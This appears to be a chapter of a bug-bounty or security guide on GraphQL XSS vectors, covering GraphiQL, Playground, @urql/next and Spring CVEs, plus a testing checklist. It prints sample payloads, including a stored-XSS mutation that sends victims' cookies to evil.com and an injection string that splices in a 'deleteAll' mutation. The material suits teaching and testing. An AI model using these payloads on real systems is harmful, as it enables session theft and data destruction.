# 60 - GraphQL-Specific XSS Vectors

## Overview

GraphQL introduces XSS risks through:
- IDE/explorer tools (GraphiQL, GraphQL Playground) that render query parameters and introspection responses
- Client libraries (@urql/next) that fail to escape HTML in streaming responses
- Error messages reflecting user input in the `message` field
- Mutation endpoints accepting and returning unsanitized rich text
- Missing Subresource Integrity on CDN-loaded scripts in GraphQL integrations
- Subscription message rendering without encoding

## @urql/next RSC Hydration XSS (CVE-2024-24556)

**CVE-2024-24556:** All versions of @urql/next before 1.1.1 failed to escape HTML-like characters in the response stream. Specifically, @urql/next failed to escape HTML characters in JSON payloads injected into React Server Component (RSC) hydration bodies.

Exploitation requires the response to contain HTML tags and the app to use streamed (non-RSC) responses. CVSS scores conflict: NVD says 6.1 (Medium), Wiz and Fluidattacks say High.

```jsx
// VULNERABLE: @urql/next streaming without HTML escaping
// The GraphQL response data flows through RSC hydration
// If a field contains <script>alert(1)</script>, it injects
// into the hydration body unescaped

// The fix (commit 4b7011b) escapes HTML entities in the stream
```

This represents a newer class of GraphQL XSS where the vulnerability is in the client-side framework's streaming/hydration mechanism rather than the GraphQL layer itself.

## GraphiQL XSS Vectors

### Backslash Bypass (CVE-2026-42794)

**CVE-2026-42794:** Reflected XSS in GraphiQL's escaping function. The escaping routine handles single quotes and newlines but fails to handle backslashes, allowing an attacker to break out of a string context via the `query` GET parameter. Affects versions 1.2.0+ and 20241017cb+.

```
# Attack: The escaping handles ' and \n but not \
# A crafted query parameter uses \' to neutralize quote escaping
# and inject JavaScript

GET /graphiql?query=\'-alert(1)-\' HTTP/1.1
```

Despite the Low CVSS (2.3), it is exploitable in any deployment that accepts GET-parameterized queries, which is a common configuration for shareable GraphiQL links.

### Introspection Response XSS (CVE-2021-41248)

**CVE-2021-41248:** All versions of GraphiQL before 1.4.7 were vulnerable to XSS through malicious schema introspection responses or crafted type names during operation autocomplete. **Still affecting deployments in 2026:** IBM's April 2026 bulletin says it affects watsonx.data 2.3.

```graphql
# Attack: Schema type with XSS payload in name
# When GraphiQL renders the type in autocomplete, XSS fires
type "<img src=x onerror=alert(1)>" {
  field: String
}
```

### GraphQL Playground Endpoint Manipulation (CVE-2021-41249)

**CVE-2021-41249:** The `endpoint` query parameter in GraphQL Playground allows loading a malicious schema URL directly. Fixed in graphql-playground-react 1.7.28.

## Spring for GraphQL CVEs

### Missing SRI on CDN Scripts (CVE-2026-59286)

**CVE-2026-59286:** Missing Subresource Integrity (SRI) on CDN-loaded scripts in the GraphiQL integration of Spring for GraphQL. This creates an XSS risk through CDN compromise or MITM. Affects versions 1.0.0 through 2.0.4.

### Information Leak via Malicious URL (CVE-2026-59288)

**CVE-2026-59288:** Information leak via malicious URL in GraphiQL. Affects versions 1.0.0 through 2.0.4.

## GraphQL Error Message Reflection

GraphQL error responses include user input in the `message` field, creating reflected XSS when rendered in HTML.

```graphql
# Attack: Send invalid input that gets reflected in error message
mutation {
  createUser(name: "<script>alert(1)</script>") {
    id
  }
}

# Response:
{
  "errors": [{
    "message": "Validation error: '<script>alert(1)</script>' is not a valid name",
    "locations": [{"line": 2, "column": 3}]
  }]
}
# If the frontend renders error.message via innerHTML, XSS fires
```

GraphQL's typed schema can provide a false sense of security: field type validation (String, Int) does not prevent XSS in String fields.

## GraphQL Mutation Stored XSS

```graphql
# Attack: Store XSS payload via GraphQL mutation
mutation {
  updateProfile(
    bio: "<img src=x onerror='fetch(`https://evil.com/steal?c=${document.cookie}`)'>"
  ) {
    id
    bio
  }
}

# When another user queries the profile and the frontend renders bio
# via innerHTML or v-html, the stored XSS fires
query {
  user(id: "victim") {
    bio  # Contains the XSS payload
  }
}
```

Batch queries in GraphQL can amplify XSS testing by sending multiple mutation variants in a single request.

## GraphQL Injection via Document String

GraphQL injection occurs when user data goes into the document string itself rather than the variables map, allowing the parser to interpret attacker-controlled syntax.

```javascript
// VULNERABLE: User input concatenated into query string
const query = `
  query {
    search(term: "${userInput}") {
      results
    }
  }
`;

// Payload: userInput = '") { __typename } mutation { deleteAll { count } } #'
// This breaks out of the search query and injects a mutation

// SAFE: Use variables map
const query = `
  query Search($term: String!) {
    search(term: $term) { results }
  }
`;
const variables = { term: userInput };
```

## Introspection Response Rendering XSS

When introspection is enabled in production, it discloses types and operations including sensitive queries and mutations. Schema reconstruction through error messages is possible using tools like Clairvoyance even when introspection is disabled.

```javascript
// VULNERABLE: Rendering introspection results without encoding
fetch('/graphql', {
  method: 'POST',
  body: JSON.stringify({query: '{ __schema { types { name description } } }'})
})
.then(r => r.json())
.then(data => {
  data.data.__schema.types.forEach(type => {
    // If type.description contains XSS and is rendered via innerHTML
    typesDiv.innerHTML += `<div><b>${type.name}</b>: ${type.description}</div>`;
  });
});
```

## express-graphql Legacy XSS

**WS-2016-0142:** express-graphql versions 0.4.0 to 0.4.10 did not properly escape HTML in queries or variables. Fixed in 0.4.11.

## Testing Methodology

1. **Check GraphiQL/Playground exposure** in production environments
2. **Test query parameter injection** in GraphiQL GET requests
3. **Check SRI** on CDN-loaded scripts in GraphQL IDE integrations
4. **Test mutation endpoints** with XSS payloads in text fields
5. **Check error message rendering** -- do frontend components HTML-encode error messages?
6. **Test introspection responses** for XSS in type names and descriptions
7. **Check batch query support** for amplified XSS testing
8. **Verify variable usage** -- ensure user input goes through variables, not string concatenation

## Bug Bounty Tips

1. The 2021 GraphiQL CVE (CVE-2021-41248) continues to affect enterprise deployments (IBM watsonx) in 2026
2. CDN integrity (SRI) for GraphiQL's JavaScript dependencies is a supply-chain XSS risk
3. GraphQL mutation stored XSS is often overlooked because developers trust typed schemas
4. Check for GET-parameterized GraphiQL -- the backslash bypass (CVE-2026-42794) affects many deployments
5. GraphQL error messages that include user input are a reflected XSS vector
6. Look for @urql/next streaming responses -- the RSC hydration XSS is a newer attack class
7. No CVEs have been found for subscription message XSS, making it an underexplored area
